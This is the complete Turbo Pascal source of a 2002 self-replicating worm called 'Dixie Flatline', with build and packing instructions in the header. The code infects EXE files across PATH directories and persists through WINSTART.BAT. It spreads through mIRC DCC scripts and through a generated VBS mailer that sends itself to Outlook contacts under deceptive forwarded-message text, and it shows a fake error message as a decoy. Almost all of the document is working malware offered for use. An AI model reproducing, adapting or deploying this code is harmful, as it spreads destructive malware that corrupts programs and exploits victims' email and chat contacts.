{           ÚÄ[ 2002 (c) worm ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
            ³øÉÍÍ»       ÉÍÍ» ÉÍÍÍÍÍÍ» ÉÍÍÍÍÍÍ»  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍ»ø³
            ³ ºÛÛÈ»     É¼ÛÛºÉ¼ÛÛÛÛÛÛÈ»ºÛÛÛÛÛÛÈ» ºÛÛÛÛÛÛÛÛÛÛÛÛÛº ³
            ³ ºÛÛÛº     ºÛÛÛººÛÛÛÉ»ÛÛÛººÛÛÉÍ»ÛÛº ºÛÛÛÉ»ÛÛÛÉ»ÛÛÛº ³
            ³ ºÛÛÛºÉ» É»ºÛÛÛººÛÛÉ¼È»ÛÛººÛÛÈÍ¼ÛÛº ºÛÛÛººÉÍ»ººÛÛÛº ³
            ³ ºÛÛÛººÈÍ¼ººÛÛÛººÛÛÈ»É¼ÛÛººÛÛÛÛÛÛÛº ºÛÛÛºÈ¼ È¼ºÛÛÛº ³
            ³ ºÛÛÛÈ¼ÛÛÛÈ¼ÛÛÛººÛÛÛÈ¼ÛÛÛººÛÛÉÍ»ÛÛÈ»ºÛÛÛº     ºÛÛÛº ³
            ³ ºÛÛÛÛÛÛÛÛÛÛÛÛÛºÈ»ÛÛÛÛÛÛÉ¼ºÛÛº È»ÛÛººÛÛÉ¼     È»ÛÛº ³
            ³øÈÍÍÍÍÍÍÍÍÍÍÍÍÍ¼ ÈÍÍÍÍÍÍ¼ ÈÍÍ¼  ÈÍÍ¼ÈÍÍ¼       ÈÍÍ¼ø³
            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿     presents:     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
                        ÚÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄ¿
                        ³  øÅø DIXIE  FLATLINE øÅø  ³
                        ÀÄÄÄÅÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÅÄÄÄÙ
                            ÀÅø  21.jan.2002  øÅÙ
                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


this program is an internet worm which replicates through M$ Outlook using a
short piece of VBS code and creates/modifies SCRIPT.INI to spread via mIRC. the
worm may use three different filenames when arrives and installs. it will copy
itself into Windoze directory and create/modify WINSTART.BAT to run at startup.
it's also able to infect old EXE files in actual and PATH directories (1 file/
dir/run). when an infected program runs, original code will be decrypted and
copied into a new file, which will be executed, then deleted. the worm's body
is encrypted/compressed with a tool called 'Protect!'.

compile this source using Turbo Pascal 7.0, then type: 'PROTECT.EXE DIXIE.EXE'.
compressed file must be added some 00h bytes to be exactly 14000 bytes long.
you have to overwrite 18-19th bytes with the infection marker '@d'.
}
program dixie;
{$m 60000,0,8000}
{$i-}
uses crt,dos;
const size=14000;
      keyplace=size-1;
var i,m,n,key:integer;
    s,defaultdir,windir,mircdir,targetfile,pathvar,parameters:string;
    path:array[1..64] of string;
    name:array[1..3] of string;
    mirc:array[1..4] of string;
    copybuf:array[1..size] of char;
    ftext,hit:boolean;
    source1,source2,target:file;
    attr1,attr2,w1,w2:word;
    ftime:longint;
    t:text;
    p:pathstr;
    r:searchrec;
    ds:dirstr;
    ns:namestr;
    es:extstr;
procedure infect(this:string);
begin
 assign(source1,paramstr(0));
 assign(source2,this);
 assign(target,'~temp#1.$$$');
 getfattr(source1,attr1);
 getfattr(source2,attr2);
 setfattr(source1,archive);
 setfattr(source2,archive);
 setfattr(target,archive);
 reset(source1,1);
 reset(source2,1);
 rewrite(target,1);
 i:=0;
 repeat
  blockread(source1,copybuf,size,w1);
  blockwrite(target,copybuf,w1);
  i:=i+w1;
 until i>=size;
 seek(target,keyplace);
 key:=random(256);
 blockwrite(target,key,1);
 seek(target,size);
 repeat
  blockread(source2,copybuf,size,w1);
  for i:=1 to size do copybuf[i]:=chr(ord(copybuf[i]) xor key);
  blockwrite(target,copybuf,w1,w2);
 until (w1=0) or (w1<>w2);
 seek(source2,0);
 seek(target,0);
 getftime(source2,ftime);
 repeat
  blockread(target,copybuf,size,w1);
  blockwrite(source2,copybuf,w1,w2);
 until (w1=0) or (w1<>w2);
 setftime(source2,ftime);
 close(source2);
 close(target);
 setfattr(source1,attr1);
 setfattr(source2,attr2);
 erase(target);
 hit:=true;
end;
procedure reproduce;
begin
 hit:=false;
 findfirst('*.exe',anyfile,r);
 while (doserror=0) and (not hit) do
  begin
   assign(source1,r.name);
   getfattr(source1,attr1);
   setfattr(source1,archive);
   reset(source1,1);
   blockread(source1,copybuf,25);
   close(source1);
   setfattr(source1,attr1);
   if (copybuf[18]<>'@') and (copybuf[19]<>'d') and (copybuf[25]<>'@')
   then infect(fexpand(r.name));
   findnext(r);
  end;
end;
procedure execute;
begin
 assign(source1,paramstr(0));
 assign(target,'~temp#1.exe');
 getfattr(source1,attr1);
 setfattr(source1,archive);
 setfattr(target,archive);
 reset(source1,1);
 rewrite(target,1);
 seek(source1,keyplace);
 blockread(source1,key,1);
 seek(source1,size);
 repeat
  blockread(source1,copybuf,size,w1);
  for i:=1 to size do copybuf[i]:=chr(ord(copybuf[i]) xor key);
  blockwrite(target,copybuf,w1,w2);
 until (w1=0) or (w1<>w2);
 close(source1);
 close(target);
 setfattr(source1,attr1);
 for i:=1 to paramcount do parameters:=parameters+' '+paramstr(i);
 exec('~temp#1.exe',parameters);
 erase(target);
end;
procedure createscript(target:string);
begin
 assign(t,'script.ini');
 rewrite(t);
 writeln(t,'[script]');
 writeln(t,'n0=on 1:JOIN:#:{');
 writeln(t,'n1= /if ( $nick == $me ) { halt }');
 writeln(t,'n2= /.dcc send $nick ',target);
 writeln(t,'n3=}');
 close(t);
end;
procedure infectscript(target:string);
begin
 assign(t,'script.ini');
 getfattr(t,attr1);
 setfattr(t,archive);
 reset(t);
  repeat
   readln(t,s);
   if pos(target,s)<>0 then ftext:=true;
  until (ftext) or (eof(t));
 if not ftext then
  begin
   append(t);
   writeln(t,'');
   writeln(t,'n0=on 1:JOIN:#:{');
   writeln(t,'n1= /if ( $nick == $me ) { halt }');
   writeln(t,'n2= /.dcc send $nick ',target);
   writeln(t,'n3=}');
  end;
 close(t);
 setfattr(t,attr1);
end;
function detectwindoze:boolean;assembler;
asm
 mov ax,1600h
 int 2fh
end;
procedure searchdir(path:pathstr;fspec1:string;fspec2:string;fspec3:string);
var f:searchrec;
begin
 findfirst(path+fspec1,anyfile,f);
 if doserror=0 then mircdir:=path;
 findfirst(path+fspec2,anyfile,f);
 if doserror=0 then
  begin
   findfirst(path+fspec3,anyfile,f);
   if doserror=0 then windir:=path;
  end;
end;
procedure search(path:pathstr;fspec1:string;fspec2:string;fspec3:string);
var d:searchrec;
begin
 if (mircdir<>'') and (windir<>'') then exit;
 searchdir(path,fspec1,fspec2,fspec3);
 findfirst(path+'*.*',directory,d);
 while doserror=0 do
  begin
   if (d.attr and directory=directory) and (d.name[1]<>'.')
   then search(path+d.name+'\',fspec1,fspec2,fspec3);
   findnext(d);
  end;
end;
label 1,2;
begin
 checkbreak:=false;
 randomize;
 getdir(0,defaultdir);
 name[1]:='DIXIE.EXE';
 name[2]:='FLATLINE.EXE';
 name[3]:='ROMCARD.EXE';
 mirc[1]:='\MIRC';
 mirc[2]:='\MIRC32';
 mirc[3]:='\PROGRA~1\MIRC';
 mirc[4]:='\PROGRA~1\MIRC32';
 findfirst('\win*.*',directory,r);
 while (doserror=0) and (windir='') do
  begin
   chdir('\'+r.name);
   if (fsearch('win.com','\'+r.name)<>'') and (fsearch('win.ini','\'+r.name)<>'')
   then windir:='\'+r.name+'\';
   findnext(r);
  end;
 for i:=1 to 4 do
  begin
   if mircdir='' then
    begin
     chdir(mirc[i]);
     if fsearch('mirc.ini',mirc[i])<>'' then mircdir:=mirc[i];
    end;
  end;
 if (windir='') or (mircdir='') then search('\','mirc.ini','win.com','win.ini');
 if windir='' then goto 1;
 chdir(windir);
 for i:=1 to 3 do if fsearch(name[i],windir)<>'' then targetfile:=fexpand(name[i]);
 if targetfile='' then
  begin
   n:=random(3)+1;
   targetfile:=windir+name[n];
   assign(source1,paramstr(0));
   assign(target,targetfile);
   getfattr(source1,attr1);
   setfattr(source1,archive);
   reset(source1,1);
   rewrite(target,1);
   i:=0;
   repeat
    blockread(source1,copybuf,size,w1);
    blockwrite(target,copybuf,w1);
    i:=i+w1;
   until i>=size;
   close(source1);
   close(target);
   setfattr(source1,attr1);
   targetfile:=fexpand(name[n]);
  end;
 if mircdir<>'' then
  begin
   chdir(mircdir);
   hit:=ioresult=0;
   if fsearch('script.ini',mircdir)='' then createscript(targetfile)
    else infectscript(targetfile);
   chdir(windir);
  end;
 p:=fsearch('winstart.bat',windir);
 assign(t,'winstart.bat');
 ftext:=false;
 if p<>'' then
  begin
   getfattr(t,attr1);
   setfattr(t,archive);
   reset(t);
   repeat
    readln(t,s);
    if pos(targetfile,s)<>0 then ftext:=true;
   until (ftext) or (eof(t));
  end
  else rewrite(t);
 if not ftext then
  begin
   hit:=ioresult=0;
   append(t);
   writeln(t,'');
   writeln(t,'@'+targetfile+' /'+chr(65+random(26)));
  end;
 close(t);
 if p<>'' then setfattr(t,attr1);
 if fsearch('wscript.exe',windir)<>'' then
  begin
   if fsearch('dixie.dat',windir)='' then
    begin
     if detectwindoze then
      begin
       hit:=ioresult=0;
       assign(t,'dixie.vbs');
       setfattr(t,archive);
       rewrite(t);
       writeln(t,'on error resume next');
       writeln(t,'set v1=createobject("outlook.application")');
       writeln(t,'set v2=v1.getnamespace("mapi")');
       writeln(t,'for v3=1 to v2.addresslists.count');
       writeln(t,'set v4=v2.addresslists(v3)');
       writeln(t,'v5=1');
       writeln(t,'set v6=v1.createitem(0)');
       writeln(t,'for v7=1 to v4.addressentries.count');
       writeln(t,'v8=v4.addressentries(v5)');
       writeln(t,'v6.recipients.add v8');
       writeln(t,'v5=v5+1');
       writeln(t,'if v5>100 then exit for');
       writeln(t,'next');
       if random(2)=0 then writeln(t,'v6.subject="FWD: Stuff"')
        else writeln(t,'v6.subject="FWD: RE: Request"');
       if random(2)=0 then write(t,'v6.body="Rulez :)"&vbcrlf&vbcrlf&')
        else write(t,'v6.body="Cool! ;-)"&vbcrlf&vbcrlf&');
       write(t,'"-----Original Message-----"&vbcrlf&vbcrlf&');
       if random(2)=0 then write(t,'"> Hi,"&vbcrlf&')
        else write(t,'"> Hello!"&vbcrlf&');
       if random(2)=0 then write(t,'"> Thanks for your attendance, here''s it."&vbcrlf&')
        else write(t,'"> I''ve just finished this thing, give it a try!"&vbcrlf&');
       if random(2)=0 then write(t,'"> Please let me know if you like it."&vbcrlf&')
        else write(t,'"> I''d be happy if you could help me by sending any remarks."&vbcrlf&');
       if random(2)=0 then writeln(t,'"> C ya"')
        else writeln(t,'"> Bye now..."');
       writeln(t,'v6.attachments.add"',targetfile,'"');
       writeln(t,'v6.deleteaftersubmit=true');
       writeln(t,'v6.send');
       writeln(t,'next');
       writeln(t,'set v6=createobject("scripting.filesystemobject")');
       write(t,'v6.deletefile wscript.scriptfullname');
       close(t);
       exec('wscript.exe','dixie.vbs');
       assign(t,'dixie.dat');
       setfattr(t,archive);
       rewrite(t);
       for i:=1 to random(1000) do write(t,chr(random(256)));
       close(t);
      end;
    end;
  end;
 1:chdir(defaultdir);
 reproduce;
 pathvar:=getenv('path');
 n:=1;
 for m:=1 to length(pathvar) do
  begin
   if pathvar[m]<>';' then path[n]:=path[n]+pathvar[m]
    else
     begin
      chdir(path[n]);
      reproduce;
      inc(n)
     end;
  end;
 chdir(path[n]);
 reproduce;
 chdir('\');
 assign(t,'dixie');
 if fsearch('dixie','\')<>'' then
  begin
   setfattr(t,archive);
   erase(t);
  end
  else
   begin
    if random(20)=0 then
     begin
      hit:=ioresult=0;
      rewrite(t);
      write(t,'Hey, bro! I''m the Dixie Flatline, best cowboy that ever punched deck.');
      close(t);
      setfattr(t,archive+readonly+hidden+sysfile);
     end;
   end;
 chdir(defaultdir);
 fsplit(paramstr(0),ds,ns,es);
 for i:=1 to 3 do if ns+es=name[i] then
  begin
   if paramstr(1)='' then
    begin
     hit:=ioresult=0;
     writeln('Your program caused a divide overflow error.');
     writeln('If the problem persists, contact your program vendor.');
    end;
   goto 2;
  end;
 if random(50)=0 then writeln('dixie flatline - biocoded by worm');
 execute;
 2:checkbreak:=true;
end.